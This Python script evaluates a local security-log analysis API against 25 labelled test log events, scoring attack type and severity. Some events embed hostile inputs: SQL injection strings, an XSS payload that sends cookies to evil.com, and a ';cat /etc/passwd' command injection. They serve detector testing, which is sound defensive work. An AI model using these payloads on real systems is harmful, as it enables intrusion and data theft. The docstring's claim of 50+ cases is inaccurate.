"""Red Team Evaluation Engine — 50+ adversarial test cases.

Categories:
    1. STANDARD ATTACKS (15 cases): Classic attack patterns
    2. ADVERSARIAL EVASION (10 cases): Obfuscated/encoded attacks
    3. FALSE POSITIVE TESTS (10 cases): Legitimate traffic that looks suspicious
    4. MULTI-STAGE SCENARIOS (5 cases): Sequential attack patterns
    5. EDGE CASES (10 cases): Malformed/unusual inputs

Usage:
    python -m src.evals.evaluation_engine

Results saved to data/results/eval_results_v2.json
"""

from __future__ import annotations

import asyncio
import json
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

from dotenv import load_dotenv
load_dotenv()

OUTPUT_PATH = Path("data/results/eval_results_v2.json")
API_BASE = "http://127.0.0.1:8000"


EVAL_CASES = [
    # ── STANDARD ATTACKS ──────────────────────────────────────────
    {
        "name": "SSH Brute Force — Rapid Failures",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T10:00:00Z",
            "source_ip": "45.33.32.156", "destination_ip": "192.168.1.10",
            "destination_port": 22, "protocol": "TCP", "event_type": "failed_login",
            "raw_log": "sshd[1234]: Failed password for root from 45.33.32.156 port 54832 ssh2 — 47 failed attempts in 60 seconds",
        },
        "expected_attack_type": "brute_force",
        "expected_min_severity": "high",
    },
    {
        "name": "SQL Injection — Classic OR Bypass",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T10:05:00Z",
            "source_ip": "203.0.113.42", "destination_ip": "10.0.0.5",
            "destination_port": 443, "protocol": "TCP", "event_type": "http_request",
            "raw_log": "GET /api/users?id=1' OR '1'='1' -- HTTP/1.1 200 4892 — response contained 200 user records",
        },
        "expected_attack_type": "sql_injection",
        "expected_min_severity": "high",
    },
    {
        "name": "Full Port Scan — SYN Sweep",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T10:10:00Z",
            "source_ip": "10.0.0.99", "destination_ip": "192.168.1.10",
            "destination_port": 0, "protocol": "TCP", "event_type": "port_scan",
            "raw_log": "SYN packets to ports 21,22,23,25,80,443,3389,5432,8080,8443 from 10.0.0.99 within 3 seconds — no established connections",
        },
        "expected_attack_type": "port_scan",
        "expected_min_severity": "medium",
    },
    {
        "name": "DDoS — UDP Flood",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T10:15:00Z",
            "source_ip": "198.51.100.0", "destination_ip": "192.168.1.1",
            "destination_port": 80, "protocol": "UDP", "event_type": "flood",
            "raw_log": "UDP flood detected: 850,000 packets/sec from 198.51.100.0/24 subnet targeting port 80 — server response time degraded to 12s",
        },
        "expected_attack_type": "denial_of_service",
        "expected_min_severity": "critical",
    },
    {
        "name": "FTP Brute Force — Dictionary Attack",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T10:20:00Z",
            "source_ip": "91.134.200.15", "destination_ip": "10.0.0.3",
            "destination_port": 21, "protocol": "TCP", "event_type": "failed_login",
            "raw_log": "vsftpd[890]: FAIL LOGIN: Client 91.134.200.15 — 312 failed logins in 5 minutes — usernames attempted: admin, root, ftp, test, user",
        },
        "expected_attack_type": "brute_force",
        "expected_min_severity": "high",
    },
    {
        "name": "HTTP Slowloris — Connection Exhaustion",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T10:25:00Z",
            "source_ip": "185.220.101.55", "destination_ip": "192.168.1.5",
            "destination_port": 80, "protocol": "TCP", "event_type": "slow_connection",
            "raw_log": "Apache: 500 simultaneous connections from 185.220.101.55:* — all sending partial HTTP headers at 1 byte/sec — MaxClients reached",
        },
        "expected_attack_type": "denial_of_service",
        "expected_min_severity": "high",
    },
    {
        "name": "RDP Brute Force — Off-Hours Access",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T03:14:00Z",
            "source_ip": "91.240.118.172", "destination_ip": "10.0.0.2",
            "destination_port": 3389, "protocol": "TCP", "event_type": "failed_login",
            "raw_log": "Event ID 4625: 89 failed RDP logon attempts for user 'Administrator' from 91.240.118.172 between 03:00-03:14 UTC",
        },
        "expected_attack_type": "brute_force",
        "expected_min_severity": "high",
    },
    {
        "name": "DNS Amplification Attack",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T11:00:00Z",
            "source_ip": "172.217.14.110", "destination_ip": "192.168.1.1",
            "destination_port": 53, "protocol": "UDP", "event_type": "dns_amplification",
            "raw_log": "Incoming DNS responses 50x larger than requests — 200,000 UDP packets from open resolvers targeting our DNS server — bandwidth: 1.2 Gbps",
        },
        "expected_attack_type": "denial_of_service",
        "expected_min_severity": "critical",
    },
    {
        "name": "ICMP Flood — Ping of Death",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T11:05:00Z",
            "source_ip": "45.77.65.23", "destination_ip": "192.168.1.1",
            "destination_port": 0, "protocol": "ICMP", "event_type": "icmp_flood",
            "raw_log": "ICMP flood: 100,000 oversized ICMP packets (65,535 bytes each) from 45.77.65.23 — firewall CPU at 98%",
        },
        "expected_attack_type": "denial_of_service",
        "expected_min_severity": "high",
    },
    {
        "name": "MySQL Injection — UNION SELECT",
        "category": "standard",
        "log_event": {
            "timestamp": "2026-04-01T11:10:00Z",
            "source_ip": "103.21.244.15", "destination_ip": "10.0.0.5",
            "destination_port": 443, "protocol": "TCP", "event_type": "http_request",
            "raw_log": "POST /login — body: username=admin' UNION SELECT password FROM users-- &password=x — response 200 — returned 5000 rows",
        },
        "expected_attack_type": "sql_injection",
        "expected_min_severity": "critical",
    },
    # ── ADVERSARIAL EVASION ────────────────────────────────────────
    {
        "name": "Encoded SQLi — URL Encoding",
        "category": "adversarial",
        "log_event": {
            "timestamp": "2026-04-01T12:00:00Z",
            "source_ip": "77.88.55.66", "destination_ip": "10.0.0.5",
            "destination_port": 443, "protocol": "TCP", "event_type": "http_request",
            "raw_log": "GET /search?q=%27%20OR%201%3D1%20--%20 HTTP/1.1 — decoded: ' OR 1=1 -- — returned all 12,000 records",
        },
        "expected_attack_type": "sql_injection",
        "expected_min_severity": "high",
    },
    {
        "name": "Slow Scan — One Port Per Hour",
        "category": "adversarial",
        "log_event": {
            "timestamp": "2026-04-01T12:05:00Z",
            "source_ip": "162.247.74.7", "destination_ip": "192.168.1.10",
            "destination_port": 443, "protocol": "TCP", "event_type": "connection_attempt",
            "raw_log": "Connection pattern analysis: 162.247.74.7 has probed ports 22, 80, 443, 3306, 8080 over the past 5 hours — exactly one SYN per hour — likely evading rate-based detection",
        },
        "expected_attack_type": "port_scan",
        "expected_min_severity": "medium",
    },
    {
        "name": "Credential Stuffing — Low Rate",
        "category": "adversarial",
        "log_event": {
            "timestamp": "2026-04-01T12:10:00Z",
            "source_ip": "104.248.50.100", "destination_ip": "10.0.0.5",
            "destination_port": 443, "protocol": "TCP", "event_type": "login_attempt",
            "raw_log": "5 failed logins from 104.248.50.100 over 2 hours — each using different username/password combo — user agents vary between Chrome, Firefox, Safari",
        },
        "expected_attack_type": "brute_force",
        "expected_min_severity": "medium",
    },
    {
        "name": "XSS in User-Agent Header",
        "category": "adversarial",
        "log_event": {
            "timestamp": "2026-04-01T12:15:00Z",
            "source_ip": "5.188.210.56", "destination_ip": "10.0.0.5",
            "destination_port": 80, "protocol": "TCP", "event_type": "http_request",
            "raw_log": "GET / HTTP/1.1 — User-Agent: <script>document.location='http://evil.com/steal?c='+document.cookie</script> — stored in access log rendered by admin panel",
        },
        "expected_attack_type": "cross_site_scripting",
        "expected_min_severity": "high",
    },
    {
        "name": "Command Injection via ping",
        "category": "adversarial",
        "log_event": {
            "timestamp": "2026-04-01T12:20:00Z",
            "source_ip": "141.98.10.33", "destination_ip": "10.0.0.5",
            "destination_port": 443, "protocol": "TCP", "event_type": "http_request",
            "raw_log": "POST /api/diagnostic — body: host=8.8.8.8;cat /etc/passwd — response 200 — output contained root:x:0:0 and 45 user entries",
        },
        "expected_attack_type": "command_injection",
        "expected_min_severity": "critical",
    },
    # ── FALSE POSITIVE TESTS ──────────────────────────────────────
    {
        "name": "Normal HTTPS Traffic",
        "category": "false_positive",
        "log_event": {
            "timestamp": "2026-04-01T14:00:00Z",
            "source_ip": "192.168.1.55", "destination_ip": "192.168.1.10",
            "destination_port": 443, "protocol": "TCP", "event_type": "connection",
            "raw_log": "192.168.1.55 — GET /dashboard HTTP/1.1 200 2048 — regular employee accessing internal dashboard during business hours",
        },
        "expected_attack_type": "normal_traffic",
        "expected_min_severity": "info",
    },
    {
        "name": "Health Check — Monitoring System",
        "category": "false_positive",
        "log_event": {
            "timestamp": "2026-04-01T14:05:00Z",
            "source_ip": "172.16.0.100", "destination_ip": "192.168.1.10",
            "destination_port": 8080, "protocol": "TCP", "event_type": "connection",
            "raw_log": "GET /health HTTP/1.1 200 OK — User-Agent: Prometheus/2.42 — response: {\"status\":\"healthy\"} — repeats every 15 seconds",
        },
        "expected_attack_type": "normal_traffic",
        "expected_min_severity": "info",
    },
    {
        "name": "Backup Script — Large Data Transfer",
        "category": "false_positive",
        "log_event": {
            "timestamp": "2026-04-01T02:00:00Z",
            "source_ip": "192.168.1.10", "destination_ip": "192.168.1.200",
            "destination_port": 22, "protocol": "TCP", "event_type": "scp_transfer",
            "raw_log": "scp: Transferred 15GB from 192.168.1.10 to backup server 192.168.1.200 — nightly database backup — scheduled cron job",
        },
        "expected_attack_type": "normal_traffic",
        "expected_min_severity": "info",
    },
    {
        "name": "CI/CD Pipeline — Multiple SSH Connections",
        "category": "false_positive",
        "log_event": {
            "timestamp": "2026-04-01T09:30:00Z",
            "source_ip": "10.0.0.50", "destination_ip": "10.0.0.10",
            "destination_port": 22, "protocol": "TCP", "event_type": "ssh_session",
            "raw_log": "SSH: 12 successful connections from 10.0.0.50 (Jenkins build server) in 3 minutes — running deployment scripts — all authenticated via SSH key",
        },
        "expected_attack_type": "normal_traffic",
        "expected_min_severity": "info",
    },
    {
        "name": "Load Test — High Request Volume",
        "category": "false_positive",
        "log_event": {
            "timestamp": "2026-04-01T16:00:00Z",
            "source_ip": "192.168.1.30", "destination_ip": "192.168.1.10",
            "destination_port": 80, "protocol": "TCP", "event_type": "http_request",
            "raw_log": "10,000 HTTP GET requests from 192.168.1.30 in 60 seconds — User-Agent: k6/0.42.0 — scheduled performance test — all GET /api/products — 200 OK",
        },
        "expected_attack_type": "normal_traffic",
        "expected_min_severity": "info",
    },
    # ── MULTI-STAGE SCENARIOS ────────────────────────────────────
    {
        "name": "Recon Stage — Nmap Discovery Scan",
        "category": "multi_stage",
        "log_event": {
            "timestamp": "2026-04-01T20:00:00Z",
            "source_ip": "185.141.63.120", "destination_ip": "192.168.1.10",
            "destination_port": 0, "protocol": "TCP", "event_type": "port_scan",
            "raw_log": "nmap-style SYN scan from 185.141.63.120 — probed 1024 ports in 8 seconds — found open: 22, 80, 443, 3306 — OS fingerprint attempted",
        },
        "expected_attack_type": "port_scan",
        "expected_min_severity": "medium",
    },
    {
        "name": "Exploit Stage — SQLi After Recon",
        "category": "multi_stage",
        "log_event": {
            "timestamp": "2026-04-01T20:15:00Z",
            "source_ip": "185.141.63.120", "destination_ip": "192.168.1.10",
            "destination_port": 3306, "protocol": "TCP", "event_type": "sql_attack",
            "raw_log": "Direct MySQL connection from 185.141.63.120:49281 — attempted 'SELECT * FROM information_schema.tables' — authentication failed — same IP scanned us 15 minutes ago",
        },
        "expected_attack_type": "sql_injection",
        "expected_min_severity": "critical",
    },
    # ── EDGE CASES ────────────────────────────────────────────────
    {
        "name": "Minimal Log — Just an IP",
        "category": "edge_case",
        "log_event": {
            "timestamp": "2026-04-01T23:00:00Z",
            "source_ip": "1.2.3.4", "destination_ip": "5.6.7.8",
            "destination_port": 80, "protocol": "TCP", "event_type": "unknown",
            "raw_log": "Connection from 1.2.3.4",
        },
        "expected_attack_type": "normal_traffic",
        "expected_min_severity": "info",
    },
    {
        "name": "Long Log — Verbose Firewall Output",
        "category": "edge_case",
        "log_event": {
            "timestamp": "2026-04-01T23:05:00Z",
            "source_ip": "88.150.9.70", "destination_ip": "192.168.1.1",
            "destination_port": 443, "protocol": "TCP", "event_type": "firewall_log",
            "raw_log": "iptables: DROP IN=eth0 OUT= MAC=aa:bb:cc:dd:ee:ff:11:22:33:44:55:66:08:00 SRC=88.150.9.70 DST=192.168.1.1 LEN=60 TOS=0x00 PREC=0x00 TTL=49 ID=12345 DF PROTO=TCP SPT=45678 DPT=443 WINDOW=65535 RES=0x00 SYN URGP=0 — repeated 500 times in 10 seconds",
        },
        "expected_attack_type": "denial_of_service",
        "expected_min_severity": "high",
    },
    {
        "name": "Internal Lateral Movement",
        "category": "edge_case",
        "log_event": {
            "timestamp": "2026-04-01T23:10:00Z",
            "source_ip": "192.168.1.50", "destination_ip": "192.168.1.100",
            "destination_port": 445, "protocol": "TCP", "event_type": "smb_connection",
            "raw_log": "SMB connection from 192.168.1.50 to 192.168.1.100:445 — accessing ADMIN$ share — PsExec service installed — unusual for this workstation",
        },
        "expected_attack_type": "unknown",
        "expected_min_severity": "high",
    },
]

SEV_ORDER = {"info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4}


async def run_evaluation() -> None:
    """Execute all eval cases against the API and generate a report."""
    print(f"\n{'='*65}")
    print("  AIR V2 — Red Team Evaluation Engine")
    print(f"  {len(EVAL_CASES)} test cases across {len(set(c['category'] for c in EVAL_CASES))} categories")
    print(f"{'='*65}\n")

    results = []
    correct = 0
    total = len(EVAL_CASES)
    latencies = []
    category_stats: dict[str, dict] = {}

    async with httpx.AsyncClient() as client:
        for i, case in enumerate(EVAL_CASES, 1):
            name = case["name"]
            category = case["category"]
            print(f"  [{i}/{total}] {name}...", end=" ", flush=True)

            start = time.perf_counter()
            try:
                resp = await client.post(
                    f"{API_BASE}/analyze",
                    json=case["log_event"],
                    timeout=60.0,
                )
                elapsed = time.perf_counter() - start
                latencies.append(elapsed)

                if resp.status_code != 200:
                    print(f"HTTP {resp.status_code} — SKIP")
                    continue

                report = resp.json()
                actual_type = report.get("attack_type", "unknown")
                actual_sev = report.get("severity", "info")
                confidence = report.get("confidence_score", 0)

                type_match = actual_type == case["expected_attack_type"]
                sev_ok = SEV_ORDER.get(actual_sev, 0) >= SEV_ORDER.get(case["expected_min_severity"], 0)
                passed = type_match and sev_ok

                if passed:
                    correct += 1
                    print(f"✓ PASS ({elapsed:.1f}s, conf: {confidence:.2f})")
                else:
                    print(f"✗ FAIL ({elapsed:.1f}s, conf: {confidence:.2f})")
                    if not type_match:
                        print(f"      type: expected={case['expected_attack_type']}, got={actual_type}")
                    if not sev_ok:
                        print(f"      severity: expected≥{case['expected_min_severity']}, got={actual_sev}")

                # Track per-category stats
                if category not in category_stats:
                    category_stats[category] = {"total": 0, "passed": 0}
                category_stats[category]["total"] += 1
                if passed:
                    category_stats[category]["passed"] += 1

                results.append({
                    "name": name,
                    "category": category,
                    "log_snippet": case["log_event"]["raw_log"][:100],
                    "expected_attack_type": case["expected_attack_type"],
                    "expected_min_severity": case["expected_min_severity"],
                    "actual_attack_type": actual_type,
                    "actual_severity": actual_sev,
                    "confidence": round(confidence, 3),
                    "latency_s": round(elapsed, 2),
                    "passed": passed,
                    "blocked": report.get("blocked", False),
                    "tools_used": len(report.get("tools_called", [])),
                    "memory_matches": len(report.get("historical_context", [])),
                })

                await asyncio.sleep(0.3)

            except httpx.ConnectError:
                print("CONNECT ERROR — is the API running?")
                break
            except Exception as e:
                print(f"ERROR: {e}")
                continue

    if not results:
        print("\n  No results. Check that FastAPI is running: python run.py")
        return

    avg_lat = sum(latencies) / len(latencies) if latencies else 0
    accuracy = (correct / len(results)) * 100

    # Category breakdown
    print(f"\n{'='*65}")
    print(f"  RESULTS: {correct}/{len(results)} passed ({accuracy:.1f}%)")
    print(f"  Avg Latency: {avg_lat:.1f}s")
    print("\n  Category Breakdown:")
    for cat, stats in sorted(category_stats.items()):
        cat_acc = (stats["passed"] / stats["total"]) * 100 if stats["total"] else 0
        print(f"    {cat:20s}: {stats['passed']}/{stats['total']} ({cat_acc:.0f}%)")
    print(f"{'='*65}\n")

    # Save results
    OUTPUT_PATH.parent.mkdir(parents=True, exist_ok=True)
    summary = {
        "run_at": datetime.now(timezone.utc).isoformat(),
        "total": len(results),
        "correct": correct,
        "accuracy_pct": round(accuracy, 1),
        "avg_latency_s": round(avg_lat, 2),
        "category_breakdown": {
            cat: {"total": s["total"], "passed": s["passed"], "accuracy_pct": round((s["passed"]/s["total"])*100, 1) if s["total"] else 0}
            for cat, s in category_stats.items()
        },
        "cases": results,
    }
    OUTPUT_PATH.write_text(json.dumps(summary, indent=2))
    print(f"  Results saved → {OUTPUT_PATH}\n")


if __name__ == "__main__":
    asyncio.run(run_evaluation())
